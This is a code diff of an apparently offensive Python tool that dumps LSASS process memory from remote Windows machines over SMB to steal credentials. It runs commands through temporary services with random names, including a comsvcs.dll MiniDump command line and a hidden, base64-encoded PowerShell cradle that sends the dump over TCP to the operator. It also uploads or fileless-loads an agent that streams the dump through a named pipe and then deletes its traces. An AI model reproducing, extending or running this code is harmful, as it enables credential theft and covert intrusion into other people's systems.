@@ -27,9 +27,45 @@ class DumpMethod:
     def __init__(self, session: SmbSession):
         self.session = session
 
-    def execute(self) -> bytes:
+    def execute(self, lsass_pid: int | None = None) -> bytes:
         """Execute the dump and return the raw MDMP bytes."""
         raise NotImplementedError
+
+    def _find_lsass_pid(self) -> int:
+        """Find lsass.exe PID by querying the SamSs service."""
+        with self.session.open_pipe("svcctl") as pipe:
+            svc = SvcCtl(pipe)
+            svc.bind()
+            svc.open_sc_manager()
+            svc_handle = svc.open_service("SamSs")
+            pid = svc.query_service_pid(svc_handle)
+            svc.close_handle(svc_handle)
+            return pid
+
+    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
+        """Execute a command by creating and starting a temporary service."""
+        with self.session.open_pipe("svcctl") as pipe:
+            svc = SvcCtl(pipe)
+            svc.bind()
+            svc.open_sc_manager()
+
+            svc_handle = svc.create_service(
+                service_name=svc_name,
+                display_name=svc_name,
+                binary_path=cmd,
+            )
+
+            try:
+                svc.start_service(svc_handle)
+            except RuntimeError:
+                pass  # expected for one-shot services
+
+            try:
+                svc.delete_service(svc_handle)
+            except RuntimeError:
+                pass
+
+            svc.close_handle(svc_handle)
 
 
 class ComSvcsDump(DumpMethod):
@@ -49,30 +85,22 @@ class ComSvcsDump(DumpMethod):
         dump_path = f"C:\\Windows\\Temp\\{dump_name}"
         svc_name = random_name(10)
 
-        # If PID not provided, we need to find lsass.exe PID
-        # Use tasklist via service command to find it
         if lsass_pid is None:
-            lsass_pid = self._find_lsass_pid(svc_name)
+            lsass_pid = self._find_lsass_pid()
 
-        # Build the command line
         cmd = (
             f"%COMSPEC% /Q /c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
             f"MiniDump {lsass_pid} {dump_path} full"
         )
 
-        # Execute via service creation
         self._exec_via_service(svc_name, cmd)
-
-        # Wait for the dump to be written
         time.sleep(5)
 
-        # Retrieve the dump via SMB (ADMIN$ maps to C:\Windows)
         try:
             dump_data = self.session.read_file("ADMIN$", f"Temp\\{dump_name}")
         except Exception as e:
             raise RuntimeError(f"Failed to read dump file: {e}") from e
         finally:
-            # Always clean up
             try:
                 self.session.delete_file("ADMIN$", f"Temp\\{dump_name}")
             except Exception:
@@ -82,46 +110,6 @@ class ComSvcsDump(DumpMethod):
             raise RuntimeError("Retrieved data is not a valid minidump")
 
         return dump_data
-
-    def _find_lsass_pid(self, svc_name: str) -> int:
-        """Find lsass.exe PID by querying the SamSs service (which runs in lsass.exe)."""
-        with self.session.open_pipe("svcctl") as pipe:
-            svc = SvcCtl(pipe)
-            svc.bind()
-            svc.open_sc_manager()
-            svc_handle = svc.open_service("SamSs")
-            pid = svc.query_service_pid(svc_handle)
-            svc.close_handle(svc_handle)
-            return pid
-
-    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
-        """Execute a command by creating and starting a temporary service."""
-        with self.session.open_pipe("svcctl") as pipe:
-            svc = SvcCtl(pipe)
-            svc.bind()
-            svc.open_sc_manager()
-
-            # Create and start the service
-            svc_handle = svc.create_service(
-                service_name=svc_name,
-                display_name=svc_name,
-                binary_path=cmd,
-            )
-
-            try:
-                svc.start_service(svc_handle)
-            except RuntimeError:
-                # Service may fail to start (command exits immediately)
-                # That's expected for one-shot commands
-                pass
-
-            # Clean up: delete the service
-            try:
-                svc.delete_service(svc_handle)
-            except RuntimeError:
-                pass
-
-            svc.close_handle(svc_handle)
 
 
 class SilentDump(DumpMethod):
@@ -140,21 +128,19 @@ class SilentDump(DumpMethod):
 
         svc_name = random_name(10)
 
-        # Start TCP listener
+        if lsass_pid is None:
+            lsass_pid = self._find_lsass_pid()
+
         receiver = DumpReceiver(port=listen_port)
         listen_port = receiver.start()
 
-        # PowerShell cradle that reads LSASS and sends over TCP
-        # Uses .NET P/Invoke for MiniDumpWriteDump — no comsvcs.dll involved
-        local_ip = self.session._conn.server_name  # Will need adjustment
+        local_ip = self.session._conn.server_name
         ps_script = self._build_ps_cradle(lsass_pid, local_ip, listen_port)
 
-        # Encode as base64 for PowerShell -EncodedCommand
         import base64
         encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode()
         cmd = f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded}"
 
-        # Execute
         self._exec_via_service(svc_name, cmd)
 
         # Wait for data
@@ -164,30 +150,6 @@ class SilentDump(DumpMethod):
             raise RuntimeError("Received data is not a valid minidump")
 
         return dump_data
-
-    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
-        with self.session.open_pipe("svcctl") as pipe:
-            svc = SvcCtl(pipe)
-            svc.bind()
-            svc.open_sc_manager()
-
-            svc_handle = svc.create_service(
-                service_name=svc_name,
-                display_name=svc_name,
-                binary_path=cmd,
-            )
-
-            try:
-                svc.start_service(svc_handle)
-            except RuntimeError:
-                pass
-
-            try:
-                svc.delete_service(svc_handle)
-            except RuntimeError:
-                pass
-
-            svc.close_handle(svc_handle)
 
     def _build_ps_cradle(self, pid: int | None, callback_host: str, port: int) -> str:
         """Build the PowerShell script that dumps LSASS and sends via TCP."""
@@ -219,61 +181,127 @@ Remove-Item $tmp -Force
 
 
 class PipeDump(DumpMethod):
-    """Fileless method: native agent loaded via UNC, dump streamed via named pipe.
+    """Native agent dump: indirect syscalls, dump streamed via named pipe.
 
-    The agent binary is served from a local SMB share and executed as a service.
-    It reads LSASS memory using indirect syscalls and streams the MiniDump
-    directly through a named pipe — nothing is written to the target's disk.
+    Two delivery modes:
+    - Disk-based (default): agent uploaded to ADMIN$/Temp, executed, deleted.
+    - Fileless (--lhost): agent served via local SMB share, loaded via UNC path.
+
+    In both modes the dump data never touches the target's disk — it streams
+    through a named pipe directly to the attacker.
     """
 
     name = "pipe"
 
-    def __init__(self, session: SmbSession, lhost: str, agent_path: str):
+    def __init__(self, session: SmbSession, agent_path: str, lhost: str | None = None):
         super().__init__(session)
-        self.lhost = lhost
         self.agent_path = agent_path
+        self.lhost = lhost
 
     def execute(self, lsass_pid: int | None = None) -> bytes:
+        import threading
+
         if lsass_pid is None:
-            lsass_pid = self._find_lsass_pid("")
+            lsass_pid = self._find_lsass_pid()
 
         pipe_name = random_name(12)
         svc_name = random_name(10)
-        share_name = random_name(6)
 
-        # Service binary path points to the agent on our SMB share
-        # The agent takes: <PID> <PIPE_NAME>
-        binary_path = f"\\\\{self.lhost}\\{share_name}\\agent.exe {lsass_pid} {pipe_name}"
+        if self.lhost:
+            binary_path, cleanup = self._setup_unc(svc_name, lsass_pid, pipe_name)
+        else:
+            binary_path, cleanup = self._setup_disk(lsass_pid, pipe_name)
 
-        # Start SMB server to serve the agent
-        from .smbserver import serve_agent
-        server = serve_agent(self.agent_path, share_name)
-
-        try:
-            # Create and start the service
+        # Start service in a thread (blocks briefly during SCM call)
+        def _start():
             self._exec_via_service(svc_name, binary_path)
 
-            # Connect to the named pipe on the target and read the dump
-            time.sleep(2)
-            dump_data = self._read_pipe(pipe_name)
+        t = threading.Thread(target=_start, daemon=True)
+        t.start()
+
+        # Connect to the agent's pipe with retries
+        try:
+            dump_data = self._read_pipe_with_retry(pipe_name, timeout=30)
         finally:
-            server.stop()
+            t.join(timeout=10)
+            cleanup()
 
         if not dump_data or dump_data[:4] != b"MDMP":
             raise RuntimeError("Received data is not a valid minidump")
 
         return dump_data
 
-    def _read_pipe(self, pipe_name: str) -> bytes:
-        """Read dump data from the agent's named pipe via IPC$."""
-        chunks = []
-        with self.session.open_pipe(pipe_name) as pipe:
-            while True:
-                try:
-                    chunk = pipe.read(65536)
-                    if not chunk:
-                        break
-                    chunks.append(chunk)
-                except Exception:
-                    break
-        return b"".join(chunks)
+    def _setup_disk(self, pid: int, pipe_name: str) -> tuple[str, callable]:
+        """Upload agent to ADMIN$/Temp, return binary_path and cleanup function."""
+        from smbprotocol.open import (
+            Open, CreateDisposition, CreateOptions,
+            FileAttributes, FilePipePrinterAccessMask, ImpersonationLevel,
+        )
+
+        agent_name = f"{random_name()}.exe"
+
+        with open(self.agent_path, "rb") as f:
+            agent_data = f.read()
+
+        tree = self.session.tree_connect("ADMIN$")
+        fh = Open(tree, f"Temp\\{agent_name}")
+        fh.create(
+            impersonation_level=ImpersonationLevel.Impersonation,
+            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
+            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
+            share_access=0,
+            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
+            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
+        )
+        offset = 0
+        while offset < len(agent_data):
+            chunk = agent_data[offset:offset + 65536]
+            fh.write(chunk, offset)
+            offset += len(chunk)
+        fh.close(get_attributes=False)
+
+        binary_path = f"C:\\Windows\\Temp\\{agent_name} {pid} {pipe_name}"
+
+        def cleanup():
+            try:
+                self.session.delete_file("ADMIN$", f"Temp\\{agent_name}")
+            except Exception:
+                pass
+
+        return binary_path, cleanup
+
+    def _setup_unc(self, svc_name: str, pid: int, pipe_name: str) -> tuple[str, callable]:
+        """Set up UNC-based delivery via local SMB server (truly fileless)."""
+        from .smbserver import serve_agent
+
+        share_name = random_name(6)
+        server = serve_agent(self.agent_path, share_name)
+        binary_path = f"\\\\{self.lhost}\\{share_name}\\agent.exe {pid} {pipe_name}"
+
+        def cleanup():
+            server.stop()
+
+        return binary_path, cleanup
+
+    def _read_pipe_with_retry(self, pipe_name: str, timeout: int = 30) -> bytes:
+        """Connect to the agent's pipe with retries, then read all dump data."""
+        import time as _time
+
+        deadline = _time.monotonic() + timeout
+        while _time.monotonic() < deadline:
+            try:
+                with self.session.open_pipe(pipe_name) as pipe:
+                    chunks = []
+                    while True:
+                        try:
+                            chunk = pipe.read(65536)
+                            if not chunk:
+                                break
+                            chunks.append(chunk)
+                        except Exception:
+                            break
+                    return b"".join(chunks)
+            except Exception:
+                _time.sleep(1)
+
+        raise RuntimeError(f"Timeout connecting to agent pipe '{pipe_name}'")
